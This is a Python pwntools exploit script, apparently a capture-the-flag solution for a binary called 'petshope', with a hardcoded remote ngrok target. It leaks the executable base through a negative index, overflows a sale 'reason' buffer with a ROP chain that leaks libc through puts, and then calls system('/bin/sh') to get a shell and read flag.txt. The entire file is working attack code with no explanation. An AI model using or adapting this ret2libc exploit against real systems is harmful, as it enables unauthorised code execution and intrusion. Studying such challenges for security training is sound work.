#!/usr/bin/python3

from pwn import *

exe = ELF('petshope', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*buy+289
                b*info+383
                b*sell+245
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('0.tcp.ap.ngrok.io',17568)
else:
        p = process(exe.path)

def buy(pet, choice, name):
        p.recvline()
        sla(b'--> ',b'buy ' + pet + b' ' + str(choice).encode())
        p.recvline()
        sla(b'--> ',name)
        p.recvline()
        p.recvline()
def sell(index,size,reason):
        p.recvline()
        sla(b'--> ',b'sell ' + str(index).encode())
        p.recvline()
        p.recvline()
        sla(b'--> ',size)
        p.recvline()
        sla(b'--> ',reason)
def show():
        p.recvline()
        sla(b'--> ',b'info mine')

p.recvline()
p.recvline()
# GDB()

idx = (exe.got.puts - exe.sym.cats)/8 +1

buy(b'cat',-2,b'a'*1023)

show()
p.recvuntil(b'1. ')
exe_leak = u64(p.recv(6)+b'\0\0')
exe.address = exe_leak - 0x4008
info("exe leak: "  + hex(exe_leak))
info("exe base: "  + hex(exe.address))

pop_rdi = exe.address + 0x0000000000001a13

payload = b'a'*0x209
payload += p64(pop_rdi) + p64(exe.got.puts) 
payload += p64(exe.plt.puts) + p64(exe.sym.main)

sell(0,b'',payload)

p.recvuntil(b'reasonable!\n')
libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - libc.sym.puts
info("libc leak: " + hex(libc_leak))
info("libc base:" + hex(libc.address))

payload = b'a'*0x209
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))
payload += p64(pop_rdi+1) + p64(libc.sym.system)

buy(b'cat',0,b'a'*1023)

sell(1,b'',payload)
s(b"ls\n")
s(b"cat flag.txt\n")
p.interactive()
